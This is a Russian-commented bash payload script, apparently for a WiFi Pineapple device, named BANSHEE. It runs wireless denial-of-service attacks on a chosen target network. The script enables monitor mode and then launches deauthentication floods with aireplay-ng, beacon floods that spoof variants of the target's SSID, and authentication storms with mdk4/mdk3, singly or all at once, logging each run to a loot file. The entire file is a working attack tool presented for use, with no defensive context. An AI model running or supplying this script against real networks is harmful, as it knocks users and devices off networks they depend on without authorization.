#!/bin/bash
. /root/payloads/library/nullsec-ui.sh
#═══════════════════════════════════════════════════════════════════════════════
# BANSHEE - Широковещательная Атака Сетевого Сигнала Харассер и Элиминатор Окружения
# Разработано: bad-antics
# 
# Мульти-векторный хаос - бьет по всему сразу с кричащими атаками
#═══════════════════════════════════════════════════════════════════════════════

# Автоопределение правильного беспроводного интерфейса (экспортирует $IFACE).
# Возвращается к показу диалога ошибки пейджера, если ничего не подключено.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

source /mmc/nullsec/lib/nullsec-scanner.sh 2>/dev/null

LOOT_DIR="/mmc/nullsec/banshee"
mkdir -p "$LOOT_DIR"

PROMPT "    ╔╗ ╔═╗╔╗╔╔═╗╦ ╦╔═╗╔═╗
    ╠╩╗╠═╣║║║╚═╗╠═╣║╣ ║╣ 
    ╚═╝╩ ╩╝╚╝╚═╝╩ ╩╚═╝╚═╝
━━━━━━━━━━━━━━━━━━━━━━━━━
Беспроводной Вой

Мульти-векторная атака,
которая кричит через
все частоты.

ХАОС ВОПЛОЩЕННЫЙ
━━━━━━━━━━━━━━━━━━━━━━━━━
Разработано: bad-antics
Нажмите OK, чтобы КРИЧАТЬ."

# Сканирование целей
nullsec_select_target
[ -z "$SELECTED_BSSID" ] && { ERROR_DIALOG "Цель не выбрана!"; exit 1; }

PROMPT "ЦЕЛЬ ЗАФИКСИРОВАНА:
$SELECTED_SSID

РЕЖИМЫ BANSHEE:
1. Вой (потоп деаутентификации)
2. Визг (хаос маяков)
3. Выть (бури аутентификации)
4. Крик (ВСЕ атаки)

Выберите ваш крик..."

MODE=$(NUMBER_PICKER "Режим (1-4):" 4)
DURATION=$(NUMBER_PICKER "Длительность (сек):" 60)

INTERFACE="$IFACE"
airmon-ng check kill 2>/dev/null
airmon-ng start $INTERFACE >/dev/null 2>&1
MON_IF="${INTERFACE}mon"
[ ! -d "/sys/class/net/$MON_IF" ] && MON_IF="$INTERFACE"

iwconfig $MON_IF channel $SELECTED_CHANNEL 2>/dev/null

LOOT_FILE="$LOOT_DIR/banshee_$(date +%Y%m%d_%H%M%S).txt"
cat > "$LOOT_FILE" << EOF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 BANSHEE - Журнал Атаки
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Цель: $SELECTED_SSID ($SELECTED_BSSID)
 Канал: $SELECTED_CHANNEL
 Режим: $MODE
 Длительность: ${DURATION}с
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Разработано: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EOF

LOG "BANSHEE ВОЕТ..."
SPINNER_START "Кричу на $SELECTED_SSID..."

launch_wail() {
    timeout $DURATION aireplay-ng --deauth 0 -a $SELECTED_BSSID $MON_IF 2>/dev/null &
    echo "[$(date)] ВОЙ: Потоп деаутентификации на $SELECTED_BSSID" >> "$LOOT_FILE"
}

launch_shriek() {
    # Потоп маяков с вариациями SSID цели
    for i in {1..10}; do
        FAKE_SSID="${SELECTED_SSID:0:$((${#SELECTED_SSID}-2))}$RANDOM"
        echo "$FAKE_SSID" >> /tmp/banshee_beacons.txt
    done
    if command -v mdk4 &>/dev/null; then
        timeout $DURATION mdk4 $MON_IF b -f /tmp/banshee_beacons.txt -s 1000 2>/dev/null &
    elif command -v mdk3 &>/dev/null; then
        timeout $DURATION mdk3 $MON_IF b -f /tmp/banshee_beacons.txt -s 1000 2>/dev/null &
    fi
    echo "[$(date)] ВИЗГ: Хаос маяков запущен" >> "$LOOT_FILE"
}

launch_howl() {
    # Бури аутентификации
    if command -v mdk4 &>/dev/null; then
        timeout $DURATION mdk4 $MON_IF a -a $SELECTED_BSSID -m 2>/dev/null &
    elif command -v mdk3 &>/dev/null; then
        timeout $DURATION mdk3 $MON_IF a -a $SELECTED_BSSID -m 2>/dev/null &
    fi
    echo "[$(date)] ВЫТЬ: Буря аутентификации на $SELECTED_BSSID" >> "$LOOT_FILE"
}

case $MODE in
    1) launch_wail ;;
    2) launch_shriek ;;
    3) launch_howl ;;
    4)
        launch_wail
        launch_shriek
        launch_howl
        ;;
esac

sleep $DURATION

SPINNER_STOP

# Подсчет отправленных пакетов
DEAUTH_COUNT=$(grep -c "Sending DeAuth" /tmp/*.log 2>/dev/null || echo "1000+")

echo "" >> "$LOOT_FILE"
echo "[$(date)] BANSHEE замолчал после ${DURATION}с" >> "$LOOT_FILE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" >> "$LOOT_FILE"
echo " NullSec Pineapple Suite | Разработано: bad-antics" >> "$LOOT_FILE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" >> "$LOOT_FILE"

# Очистка
pkill -f "aireplay\|mdk" 2>/dev/null
rm -f /tmp/banshee_beacons.txt
airmon-ng stop $MON_IF 2>/dev/null

PROMPT "BANSHEE ЗАМОЛЧАЛ
━━━━━━━━━━━━━━━━━━━━━━━━━
Крик останавливается.

Цель: $SELECTED_SSID
Длительность: ${DURATION}с
Режим: $MODE

Хаос выпущен.

Журнал: $LOOT_FILE
━━━━━━━━━━━━━━━━━━━━━━━━━
Разработано: bad-antics"
